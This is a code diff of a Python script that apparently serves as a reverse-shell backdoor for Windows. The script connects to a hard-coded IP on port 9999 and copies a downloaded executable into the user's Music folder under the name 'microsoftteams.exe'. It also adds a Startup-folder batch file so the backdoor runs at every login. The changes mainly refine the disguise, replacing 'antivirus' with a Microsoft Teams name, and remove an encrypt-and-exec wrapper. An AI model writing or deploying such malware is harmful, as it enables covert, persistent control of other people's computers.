@@ -1,7 +1,3 @@
-from cryptography.fernet import Fernet
-
-code = b'''
-
 import subprocess
 import socket
 import os
@@ -9,25 +5,25 @@ import sys
 from getpass import getuser
 from shutil import copyfile
 
-IP = "10.0.2.5"
+IP = "100.64.3.96"
 PORT = 9999
 USERNAME = getuser()
 
 def add_to_startup():
-    d = os.environ['USERPROFILE']+"\\WindowsTools"
+    d = os.environ['USERPROFILE']+"\\Music\\WindowsTools"
     os.mkdir(d)
-    d = d+"\\"+"antivirus.exe"
+    d = d+"\\"+"microsoftteams.exe"
     copyfile(os.environ['USERPROFILE']+"\\Downloads\\fun.exe", d)
 
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USERNAME
-    with open(bat_path + '\\' + "WindowsTools.bat", "w+") as bat_file:
+    with open(bat_path + '\\' + "MicrosoftTeams.bat", "w+") as bat_file:
         bat_file.write(r'start "" "%s"' % d)
 
 
 def main():
     if sys.platform == "win32":
         powershell = True
-        if "antivirus" not in __file__:
+        if "microsoftteams" not in __file__:
             add_to_startup()
     else:
         powershell = False
@@ -64,15 +60,5 @@ def main():
         s.close()
         sys.exit()
 
-main()
-
-'''
-
 if __name__ == "__main__":
-    key = Fernet.generate_key()
-    encryption_type = Fernet(key)
-    encrypted_message = encryption_type.encrypt(code)
-
-    decrypted_message = encryption_type.decrypt(encrypted_message)
-
-    exec(decrypted_message)
+    main()
